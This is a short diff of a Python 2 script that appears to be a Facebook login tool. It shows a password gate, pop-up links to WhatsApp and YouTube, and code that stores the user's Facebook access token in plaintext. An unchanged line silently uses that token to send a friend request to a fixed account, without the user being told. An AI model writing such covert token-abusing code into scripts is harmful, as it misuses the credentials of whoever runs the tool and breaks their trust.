@@ -119,7 +119,7 @@ while (loop == 'true'):
         if (password == CorrectPassword):
             print "LOGIN SUCCESS " + username #Dev:love_hacker
 	    time.sleep(1)
-            login()
+            loop = 'false'
         else:
             print "\033[1;93mpassword salah!"
             os.system('xdg-open https://wa.me/6281273996358')
@@ -169,8 +169,8 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;92mLogin Successful.•◈•..'
-				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				print '\n\x1b[1;92mLogin Successful.•◈•.'
+				os.system('xdg-open https://wa.me/6281273996358')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
